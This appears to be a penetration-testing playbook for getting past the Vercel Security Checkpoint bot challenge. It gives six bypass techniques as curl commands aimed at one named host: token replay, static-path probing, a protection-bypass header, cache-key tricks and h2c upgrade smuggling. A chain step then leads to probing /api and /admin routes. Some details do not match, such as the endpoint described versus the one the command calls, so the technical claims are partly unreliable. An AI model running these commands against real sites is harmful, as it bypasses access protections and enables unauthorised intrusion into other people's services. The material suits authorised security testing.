# cap-vercel-challenge-bypass

**Capability:** Confirm or refute that the Vercel Security Checkpoint
(bot challenge) can be bypassed on a target via known techniques.

A vanilla "Vercel WAF is in front" finding is `info` on its own
(it's a posture observation). This pack turns it into `high` if any
challenge-bypass actually works.

## Inputs

- A surface that returned `403` with `x-vercel-mitigated: challenge`
  and an `x-vercel-challenge-token` header.
- The challenge token from the original `403` response.

## Procedure

Each technique below corresponds to a known Vercel-challenge edge.
Run them in order and stop at the first success.

### 1. Challenge-token replay

Vercel issues a fresh challenge token per request, then accepts it
back on a follow-up `_vercel/challenge/verify` POST. If the verify
endpoint accepts a stale token, that's a replay bug.

```sh
TOKEN=$(curl -sSI "https://app.tenkara.ai/" | awk -F': ' '/^x-vercel-challenge-token:/{print $2}' | tr -d '\r')
echo "token=$TOKEN"
curl -sS --max-time 10 -X POST "https://app.tenkara.ai/.well-known/vercel/security/request-challenge" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\"}" -i | head -10
```

Expected: `400` or `403`. If the verify endpoint returns `200` and
sets a `x-vercel-protection-bypass` cookie, **`high`** "Vercel
challenge token verify accepts payload without proof-of-work".

### 2. Prerender / static-asset bypass

Vercel serves pre-rendered pages and static assets through a
different code path that historically didn't apply the bot
challenge. Probe known Next.js static paths:

```sh
for path in /_next/static/css/dummy.css /_next/data/build-id/dummy.json /favicon.ico /_next/image; do
  curl -sSI --max-time 10 "https://app.tenkara.ai$path" -w "  for $path -> %{http_code}\n"
done
```

Any `200` (especially `/_next/image`) → **`medium`** "Next.js
static/image route bypasses the Vercel challenge". `404` is fine
(the bypass *failed*; the challenge still applies).

### 3. `_vercel/insights` / telemetry endpoints

```sh
curl -sSI --max-time 10 "https://app.tenkara.ai/_vercel/insights/script.js"
curl -sSI --max-time 10 "https://app.tenkara.ai/_vercel/speed-insights/script.js"
```

`200` → **`info`** ("telemetry endpoints reachable without
challenge"). Useful for fingerprinting but not a real bypass.

### 4. `Vercel-Protection-Bypass` header

Vercel has a deployment-protection bypass feature. If the operator
ever configured one, the header value would be required, but a
common misconfig is leaving the feature enabled with no secret:

```sh
curl -sSI --max-time 10 "https://app.tenkara.ai/" -H "x-vercel-protection-bypass: 1"
curl -sSI --max-time 10 "https://app.tenkara.ai/" -H "x-vercel-set-bypass-cookie: 1"
```

If either returns `200` (instead of `403` challenge) → **`high`**
"deployment-protection bypass header honored without secret".

### 5. Cache poisoning of the challenge

Vercel uses edge caching. If `?` or trailing characters bypass cache
keys, you can get a cached pre-challenge response:

```sh
for q in "?" "?v=" "?cache=true" "/" "/?" "//"; do
  curl -sSI --max-time 10 "https://app.tenkara.ai$q" -w "  for $q -> %{http_code} %{header_x-vercel-cache}\n"
done
```

Any path returning `200` with `x-vercel-cache: HIT` while the bare
`/` returns `403` → **`high`** "edge-cache bypass of Vercel
challenge".

### 6. HTTP/2 cleartext (`h2c`) smuggling

Vercel's frontend strips HTTP/2 cleartext upgrade headers, but
historically certain rewrite rules let `h2c` traffic through the
challenge. Send an `Upgrade: h2c` request:

```sh
curl -sSI --max-time 10 "https://app.tenkara.ai/" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAAQAoAAAAAIAAAAA"
```

`200` or `101` → **`high`** "h2c upgrade bypasses Vercel challenge".

## Chain test

If any technique succeeds:

```
hypothesis: "Vercel challenge bypass -> unauthenticated reachability of app -> further enumeration"
outcome: "confirmed"
steps: [
  "<technique-name> reproduces; vanilla GET / returned 403 challenge.",
  "<bypass request> returned <status> with <evidence>.",
  "Subsequent probes against /api/* or /admin/* are now reachable."
]
```

## Severity guide

- Token verify replay accepted: **`high`**.
- Prerender / static / `/_next/image` bypass: **`medium`–`high`** depending on what's reachable behind it.
- Cache-key bypass: **`high`**.
- h2c upgrade bypass: **`high`**.
- All techniques rejected with 403: **`info`** ("Vercel challenge holds against 6 bypass techniques") — useful posture statement.

## Coverage to record

`vercel-challenge-token-replay`, `vercel-prerender-bypass`,
`vercel-telemetry-endpoints`, `vercel-protection-bypass-header`,
`vercel-cache-key-bypass`, `vercel-h2c-upgrade-bypass`.
